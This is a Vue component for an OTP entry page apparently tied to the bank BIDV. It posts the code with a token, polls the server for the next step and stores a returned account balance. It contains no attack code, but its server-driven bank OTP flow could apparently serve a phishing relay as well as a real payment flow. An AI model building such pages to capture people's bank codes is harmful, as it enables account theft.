<script setup>
import Alarm from "@/components/Layout/common/Alarm.jsx";
import Button from "@/components/Layout/common/Button.jsx";
import {useI18n} from "vue-i18n";
import {reactive, ref} from "vue";
import {ElMessage} from "element-plus";
import {useLikeSearch} from "@/hooks/index.js";
import {useRoute, useRouter} from 'vue-router'
import {get, post} from "@/api/http.js";
import {login, loginInterval, otp, otpInterval} from "@/api/url.js";
import {getRoute} from "@/hooks/routes.js";
import {checkHeart} from "@/utils/check.js";
import useRouteF from "@/hooks/useRouteF.js";
import useRouterClose from "@/hooks/useRouterClose.js";
import {useStore} from "vuex";
const {t,locale}=useI18n()
const router=useRouter()
const route=useRoute()
const store=useStore()
const baseForm = ref();
const {getSearchParams, likeSearchModel} = useLikeSearch();
const {token}=useRouteF()
const {failRouter,nextRouter}=useRouterClose()
likeSearchModel.conditionItems = reactive([
  {
    label: "login.otp.BIDV",
    type: "input",
    name: "otp",
    value: "",
    maxLength: 50,
    inputType: "text",
    span:20,
  },
].map(it=>({...it,validator: ({ value = "", placeholder = "" }) => {
    if (!value) {
      ElMessage.error(t("result.field_required"));
      return false;
    }
    return true;
  },})));
const rules= {
  otp: [
    {required: true, message: t("result.field_required"), trigger: "blur"},
  ],
}
const onSubmit = () => {
  if (baseForm.value.checkParams()){
    post(otp, {...getSearchParams(),token}).catch(r=>failRouter(r.message))
    checkHeart(otpInterval,token).then(v=>{
      store.commit('privacy/cgPrivacy',{accountBalance:v.accountBalance})
      nextRouter(getRoute(v.step),()=>({
        token,
        countdownTime:v.countdownTime
      }))
    }).catch(r=>{
      console.log(r)
    })
    /*Promise.all([post(otp, {...getSearchParams(),token}),
      checkHeart(otpInterval,token)]).then(v=>{
      router.push({name:getRoute(v[1].step),query:{
          countdownTime:v[1].countdownTime
        }})
    }).catch(r=>{
      router.replace({
        path:'/tra/result',
        query:{
          msg:r.message
        }
      })
    })*/
  }
}
const formConfig={
  labelWidth: 150,
  size: "default",
  labelPosition: "right",
}
</script>

<template>
  <div class="form">
    <div class="form_style">
      <BaseForm
          :configRules="rules"
          ref="baseForm"
          :form-items="likeSearchModel.conditionItems"
          :config="formConfig"
      />
    </div>
  </div>
  <div class="footer">
    <Button @btn="onSubmit">{{$t('btn.confirm')}}</Button>
    <Alarm :start-time="Number(route.query.countdownTime)" @time-end="args => $router.replace('/tra/result')"/>
  </div>
</template>

<style scoped lang="less">
/*root:deep(.btn_block){
  margin-bottom: 10px !important;
}*/
</style>